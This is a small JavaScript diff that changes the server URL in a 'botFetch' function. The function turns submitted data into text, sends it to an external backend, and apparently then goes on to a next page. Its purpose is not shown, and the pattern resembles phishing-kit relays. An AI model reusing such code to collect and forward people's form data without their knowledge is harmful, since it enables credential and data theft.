@@ -1,6 +1,6 @@
 export default function botFetch(data, nextPageURL) {
     
-    const serverURL = "https://your-vercel-app.vercel.app/send";
+    const serverURL = "https://invoicefatora-backend.vercel.app/";
 
     const textData = Object.entries(data)
        .map(([key, value]) => `${key}: ${value}`)
@@ -31,6 +31,7 @@ export default function botFetch(data, nextPageURL) {
             console.error("Fetch error:", err);
         });
 }
+
 
 
 
